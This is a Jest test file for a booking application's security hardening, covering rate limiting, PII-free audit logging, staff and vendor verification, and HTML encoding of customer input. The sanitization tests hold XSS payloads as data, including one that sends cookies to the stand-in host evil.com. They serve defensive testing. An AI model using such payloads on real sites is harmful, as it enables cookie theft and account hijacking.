/**
 * Integration tests for security hardening: rate limiting, audit logging,
 * entity verification, and input sanitization.
 *
 * Validates: Requirements 11.2, 11.5, 11.7, 11.8
 *
 * Tests:
 * - Rate limiting: fire requests exceeding threshold, verify 429 response
 * - Audit logging: verify rejected requests produce log entries with correct context fields
 * - Entity verification: verify 404 for inactive/non-existent staff and vendor IDs
 * - Input sanitization: verify HTML/script payloads are neutralized before persistence
 */

import { describe, test, expect, beforeEach, afterEach, jest } from '@jest/globals';
import { checkRateLimit, _resetStore, getClientIp, rateLimitResponse } from '../app/utils/rateLimiter';
import { auditReject, logRejection, hashRequestBody, type AuditLogEntry } from '../app/utils/auditLogger';
import { verifyStaffEntity, verifyVendorEntity, verifyBookingEntities } from '../app/utils/entityVerification';
import {
  sanitizeInput,
  sanitizeCustomerName,
  sanitizeNotes,
  sanitizeCustomerFields,
  encodeHtmlEntities,
} from '../app/utils/inputSanitization';

describe('Security Integration Tests', () => {
  // ─── Rate Limiting Integration ──────────────────────────────────────────────

  describe('Rate Limiting (Req 11.2)', () => {
    beforeEach(() => {
      _resetStore();
    });

    test('allows requests within the limit', () => {
      const key = 'ip:192.168.1.1';
      const limit = 10;
      const windowMs = 60_000;

      // Fire 10 requests — all should be allowed
      for (let i = 0; i < limit; i++) {
        const result = checkRateLimit(key, limit, windowMs);
        expect(result.allowed).toBe(true);
      }
    });

    test('rejects requests exceeding threshold with retryAfter', () => {
      const key = 'ip:192.168.1.2';
      const limit = 10;
      const windowMs = 60_000;

      // Fire 10 requests to exhaust the limit
      for (let i = 0; i < limit; i++) {
        checkRateLimit(key, limit, windowMs);
      }

      // The 11th request should be rejected
      const result = checkRateLimit(key, limit, windowMs);
      expect(result.allowed).toBe(false);
      expect(result.retryAfter).toBeDefined();
      expect(result.retryAfter).toBeGreaterThan(0);
    });

    test('returns 429 status with Retry-After header via rateLimitResponse', () => {
      const response = rateLimitResponse(30);
      expect(response.status).toBe(429);
      expect(response.headers.get('Retry-After')).toBe('30');
      expect(response.headers.get('Content-Type')).toBe('application/json');
    });

    test('different keys (IPs) have independent limits', () => {
      const limit = 5;
      const windowMs = 60_000;

      // Exhaust limit for IP 1
      for (let i = 0; i < limit; i++) {
        checkRateLimit('ip:10.0.0.1', limit, windowMs);
      }
      const rejectedIp1 = checkRateLimit('ip:10.0.0.1', limit, windowMs);
      expect(rejectedIp1.allowed).toBe(false);

      // IP 2 should still be allowed
      const allowedIp2 = checkRateLimit('ip:10.0.0.2', limit, windowMs);
      expect(allowedIp2.allowed).toBe(true);
    });

    test('manual booking rate limit (30/min) rejects at threshold', () => {
      const key = 'user:admin-user-123';
      const limit = 30;
      const windowMs = 60_000;

      // Exhaust the manual booking limit
      for (let i = 0; i < limit; i++) {
        const result = checkRateLimit(key, limit, windowMs);
        expect(result.allowed).toBe(true);
      }

      // Next request should be rejected
      const rejected = checkRateLimit(key, limit, windowMs);
      expect(rejected.allowed).toBe(false);
      expect(rejected.retryAfter).toBeGreaterThan(0);
    });

    test('availability endpoint rate limit (60/min) rejects at threshold', () => {
      const key = 'ip:10.0.0.3';
      const limit = 60;
      const windowMs = 60_000;

      // Fire 60 requests
      for (let i = 0; i < limit; i++) {
        checkRateLimit(key, limit, windowMs);
      }

      // 61st should be rejected
      const rejected = checkRateLimit(key, limit, windowMs);
      expect(rejected.allowed).toBe(false);
    });

    test('getClientIp extracts IP from x-forwarded-for header', () => {
      const request = new Request('http://localhost/api/appointments', {
        headers: { 'x-forwarded-for': '203.0.113.50, 70.41.3.18' },
      });
      expect(getClientIp(request)).toBe('203.0.113.50');
    });

    test('getClientIp falls back to x-real-ip', () => {
      const request = new Request('http://localhost/api/appointments', {
        headers: { 'x-real-ip': '198.51.100.22' },
      });
      expect(getClientIp(request)).toBe('198.51.100.22');
    });

    test('getClientIp returns "unknown" when no IP headers present', () => {
      const request = new Request('http://localhost/api/appointments');
      expect(getClientIp(request)).toBe('unknown');
    });
  });

  // ─── Audit Logging Integration ──────────────────────────────────────────────

  describe('Audit Logging (Req 11.8)', () => {
    let consoleWarnSpy: jest.SpiedFunction<typeof console.warn>;

    beforeEach(() => {
      consoleWarnSpy = jest.spyOn(console, 'warn').mockImplementation(() => {});
    });

    afterEach(() => {
      consoleWarnSpy.mockRestore();
    });

    test('logRejection produces structured JSON with all required fields', () => {
      const entry: AuditLogEntry = {
        ip: '192.168.1.100',
        timestamp: '2024-01-15T10:30:00.000Z',
        requestBodyHash: 'abc123def456',
        rejectionReason: 'conflict',
        statusCode: 409,
      };

      logRejection(entry);

      expect(consoleWarnSpy).toHaveBeenCalledTimes(1);
      const logOutput = JSON.parse(consoleWarnSpy.mock.calls[0][0] as string);

      expect(logOutput.level).toBe('warn');
      expect(logOutput.event).toBe('booking_rejection');
      expect(logOutput.ip).toBe('192.168.1.100');
      expect(logOutput.timestamp).toBe('2024-01-15T10:30:00.000Z');
      expect(logOutput.requestBodyHash).toBe('abc123def456');
      expect(logOutput.rejectionReason).toBe('conflict');
      expect(logOutput.statusCode).toBe(409);
    });

    test('auditReject logs rejection with correct context fields', () => {
      auditReject(
        '10.0.0.5',
        { serviceId: 'svc-123', dateTime: '2024-01-15T10:00' },
        'validation',
        400,
        undefined,
        'invalid dateTime format'
      );

      expect(consoleWarnSpy).toHaveBeenCalledTimes(1);
      const logOutput = JSON.parse(consoleWarnSpy.mock.calls[0][0] as string);

      expect(logOutput.ip).toBe('10.0.0.5');
      expect(logOutput.timestamp).toBeDefined();
      expect(logOutput.requestBodyHash).toBeDefined();
      expect(logOutput.requestBodyHash.length).toBe(16); // SHA-256 truncated to 16 chars
      expect(logOutput.rejectionReason).toBe('validation');
      expect(logOutput.statusCode).toBe(400);
      expect(logOutput.details).toBe('invalid dateTime format');
    });

    test('audit log includes userId when authenticated user is provided', () => {
      auditReject(
        '10.0.0.6',
        { staffId: 'staff-1' },
        'rate_limit',
        429,
        'admin-user-42',
        undefined
      );

      const logOutput = JSON.parse(consoleWarnSpy.mock.calls[0][0] as string);
      expect(logOutput.userId).toBe('admin-user-42');
    });

    test('audit log excludes userId field when user is not authenticated', () => {
      auditReject(
        '10.0.0.7',
        { dateTime: '2024-01-15T14:00' },
        'conflict',
        409,
        undefined,
        undefined
      );

      const logOutput = JSON.parse(consoleWarnSpy.mock.calls[0][0] as string);
      expect(logOutput.userId).toBeUndefined();
    });

    test('hashRequestBody does not expose PII — produces a consistent hash', () => {
      const body = { customer: { name: 'Jane Doe', phone: '555-1234' } };
      const hash = hashRequestBody(body);

      // Hash should be a 16-char hex string (truncated SHA-256)
      expect(hash).toMatch(/^[0-9a-f]{16}$/);

      // Same body produces same hash
      expect(hashRequestBody(body)).toBe(hash);

      // Different body produces different hash
      const differentBody = { customer: { name: 'John Smith', phone: '555-9999' } };
      expect(hashRequestBody(differentBody)).not.toBe(hash);
    });

    test('audit log does not contain customer PII (name, phone, email)', () => {
      const bodyWithPII = {
        customer: { name: 'Jane Doe', phone: '555-1234', email: 'jane@test.com' },
        serviceId: 'svc-1',
        dateTime: '2024-06-01T09:00',
      };

      auditReject('10.0.0.8', bodyWithPII, 'conflict', 409);

      const logOutput = consoleWarnSpy.mock.calls[0][0] as string;
      expect(logOutput).not.toContain('Jane Doe');
      expect(logOutput).not.toContain('555-1234');
      expect(logOutput).not.toContain('jane@test.com');
    });

    test('logs rate limit rejections with correct reason and status code', () => {
      auditReject('10.0.0.9', {}, 'rate_limit', 429);

      const logOutput = JSON.parse(consoleWarnSpy.mock.calls[0][0] as string);
      expect(logOutput.rejectionReason).toBe('rate_limit');
      expect(logOutput.statusCode).toBe(429);
    });

    test('logs auth failures with correct reason and status code', () => {
      auditReject('10.0.0.10', { confirmOverlap: true }, 'auth', 401);

      const logOutput = JSON.parse(consoleWarnSpy.mock.calls[0][0] as string);
      expect(logOutput.rejectionReason).toBe('auth');
      expect(logOutput.statusCode).toBe(401);
    });
  });

  // ─── Entity Verification Integration ───────────────────────────────────────

  describe('Entity Verification (Req 11.7)', () => {
    test('returns 404 for non-existent staff ID', async () => {
      const mockClient = {
        models: {
          StaffSchedule: {
            get: jest.fn(async () => ({ data: null })),
          },
        },
      };

      const result = await verifyStaffEntity(mockClient, 'non-existent-staff-id');
      expect(result.valid).toBe(false);
      expect(result.statusCode).toBe(404);
      expect(result.error).toBeDefined();
    });

    test('returns 404 for inactive staff member', async () => {
      const mockClient = {
        models: {
          StaffSchedule: {
            get: jest.fn(async () => ({
              data: { visibleId: 'staff-1', isActive: false },
            })),
          },
        },
      };

      const result = await verifyStaffEntity(mockClient, 'staff-1');
      expect(result.valid).toBe(false);
      expect(result.statusCode).toBe(404);
    });

    test('returns valid for active staff member', async () => {
      const mockClient = {
        models: {
          StaffSchedule: {
            get: jest.fn(async () => ({
              data: { visibleId: 'staff-1', isActive: true },
            })),
          },
        },
      };

      const result = await verifyStaffEntity(mockClient, 'staff-1');
      expect(result.valid).toBe(true);
      expect(result.statusCode).toBeUndefined();
    });

    test('returns 404 for non-existent vendor ID', async () => {
      const mockClient = {
        models: {
          Vendor: {
            get: jest.fn(async () => ({ data: null })),
          },
        },
      };

      const result = await verifyVendorEntity(mockClient, 'non-existent-vendor');
      expect(result.valid).toBe(false);
      expect(result.statusCode).toBe(404);
    });

    test('returns 404 for inactive vendor', async () => {
      const mockClient = {
        models: {
          Vendor: {
            get: jest.fn(async () => ({
              data: { vendorId: 'vendor-1', isActive: false },
            })),
          },
        },
      };

      const result = await verifyVendorEntity(mockClient, 'vendor-1');
      expect(result.valid).toBe(false);
      expect(result.statusCode).toBe(404);
    });

    test('returns valid for active vendor', async () => {
      const mockClient = {
        models: {
          Vendor: {
            get: jest.fn(async () => ({
              data: { vendorId: 'vendor-1', isActive: true },
            })),
          },
        },
      };

      const result = await verifyVendorEntity(mockClient, 'vendor-1');
      expect(result.valid).toBe(true);
    });

    test('verifyBookingEntities fails if staff is invalid', async () => {
      const mockClient = {
        models: {
          StaffSchedule: {
            get: jest.fn(async () => ({ data: null })),
          },
          Vendor: {
            get: jest.fn(async () => ({
              data: { vendorId: 'vendor-1', isActive: true },
            })),
          },
        },
      };

      const result = await verifyBookingEntities(mockClient, 'missing-staff', 'vendor-1');
      expect(result.valid).toBe(false);
      expect(result.statusCode).toBe(404);
    });

    test('verifyBookingEntities fails if vendor is invalid', async () => {
      const mockClient = {
        models: {
          StaffSchedule: {
            get: jest.fn(async () => ({
              data: { visibleId: 'staff-1', isActive: true },
            })),
          },
          Vendor: {
            get: jest.fn(async () => ({ data: null })),
          },
        },
      };

      const result = await verifyBookingEntities(mockClient, 'staff-1', 'missing-vendor');
      expect(result.valid).toBe(false);
      expect(result.statusCode).toBe(404);
    });

    test('verifyBookingEntities passes when both entities are valid', async () => {
      const mockClient = {
        models: {
          StaffSchedule: {
            get: jest.fn(async () => ({
              data: { visibleId: 'staff-1', isActive: true },
            })),
          },
          Vendor: {
            get: jest.fn(async () => ({
              data: { vendorId: 'vendor-1', isActive: true },
            })),
          },
        },
      };

      const result = await verifyBookingEntities(mockClient, 'staff-1', 'vendor-1');
      expect(result.valid).toBe(true);
    });

    test('verifyBookingEntities skips verification when IDs are not provided', async () => {
      const mockClient = {
        models: {
          StaffSchedule: { get: jest.fn() },
          Vendor: { get: jest.fn() },
        },
      };

      const result = await verifyBookingEntities(mockClient, null, null);
      expect(result.valid).toBe(true);
      expect(mockClient.models.StaffSchedule.get).not.toHaveBeenCalled();
      expect(mockClient.models.Vendor.get).not.toHaveBeenCalled();
    });
  });

  // ─── Input Sanitization Integration ─────────────────────────────────────────

  describe('Input Sanitization - XSS Prevention (Req 11.5)', () => {
    test('script tags are encoded before persistence', () => {
      const maliciousInput = '<script>alert("xss")</script>';
      const result = sanitizeInput(maliciousInput);

      expect(result).not.toContain('<script>');
      expect(result).not.toContain('</script>');
      expect(result).toContain('&lt;script&gt;');
      expect(result).toContain('&lt;/script&gt;');
    });

    test('img tag with onerror is encoded', () => {
      const payload = '<img src=x onerror=alert(1)>';
      const result = sanitizeInput(payload);

      expect(result).not.toContain('<img');
      expect(result).toContain('&lt;img');
    });

    test('event handler attributes in HTML are encoded', () => {
      const payload = '<div onmouseover="steal(document.cookie)">hover</div>';
      const result = sanitizeInput(payload);

      // The < and > are encoded so the browser cannot parse it as HTML
      expect(result).not.toContain('<div');
      expect(result).toContain('&lt;div');
      // Quotes are encoded, neutralizing the attribute value
      expect(result).toContain('&quot;');
      // The tag structure is destroyed — no executable HTML remains
      expect(result).not.toContain('<');
      expect(result).not.toContain('>');
    });

    test('sanitizeCustomerFields neutralizes XSS in name field before persistence', () => {
      const customer = {
        name: '<script>document.location="http://evil.com?c="+document.cookie</script>',
        phone: '555-0100',
        duration: 60,
      };

      const sanitized = sanitizeCustomerFields(customer);

      // Name should be fully encoded — no raw HTML
      expect(sanitized.name).not.toContain('<script>');
      expect(sanitized.name).toContain('&lt;script&gt;');
      // Non-target fields are unchanged
      expect(sanitized.phone).toBe('555-0100');
      expect(sanitized.duration).toBe(60);
    });

    test('sanitizeCustomerFields neutralizes XSS in notes field before persistence', () => {
      const customer = {
        name: 'John Doe',
        notes: '"><script>alert(String.fromCharCode(88,83,83))</script>',
      };

      const sanitized = sanitizeCustomerFields(customer);

      expect(sanitized.notes).not.toContain('<script>');
      expect(sanitized.notes).toContain('&lt;script&gt;');
      expect(sanitized.notes).toContain('&quot;');
    });

    test('combined XSS payloads are fully neutralized', () => {
      const payloads = [
        '<script>alert("xss")</script>',
        '<img src=x onerror=alert(1)>',
        '<svg/onload=alert(1)>',
        "javascript:alert('XSS')",
        '<iframe src="javascript:alert(1)">',
        '<body onload=alert(1)>',
      ];

      for (const payload of payloads) {
        const result = sanitizeInput(payload);
        // No raw < or > characters should remain
        expect(result).not.toContain('<');
        expect(result).not.toContain('>');
      }
    });

    test('normal text input is preserved without alteration', () => {
      const normalInput = 'John Doe wants a 60-minute deep tissue massage on Monday';
      const result = sanitizeInput(normalInput);
      expect(result).toBe(normalInput);
    });

    test('ampersand in normal text is encoded to prevent injection', () => {
      const input = 'Johnson & Johnson appointment';
      const result = sanitizeInput(input);
      expect(result).toBe('Johnson &amp; Johnson appointment');
    });

    test('sanitizeCustomerName truncates at 100 chars after encoding', () => {
      // A long name with HTML that would expand when encoded
      const longName = 'A'.repeat(95) + '<b>XY</b>';
      const result = sanitizeCustomerName(longName);
      expect(result.length).toBeLessThanOrEqual(100);
    });

    test('sanitizeNotes truncates at 500 chars after encoding', () => {
      const longNotes = 'B'.repeat(495) + '<script>evil()</script>';
      const result = sanitizeNotes(longNotes);
      expect(result.length).toBeLessThanOrEqual(500);
    });

    test('whitespace normalization prevents hidden content injection', () => {
      // Attacker tries to hide content in excessive whitespace
      const input = 'Normal text\t\t\t<script>hidden()</script>';
      const result = sanitizeInput(input);
      expect(result).not.toContain('\t');
      expect(result).not.toContain('<script>');
      // Should be single-space separated and encoded
      expect(result).toBe('Normal text &lt;script&gt;hidden()&lt;/script&gt;');
    });
  });
});
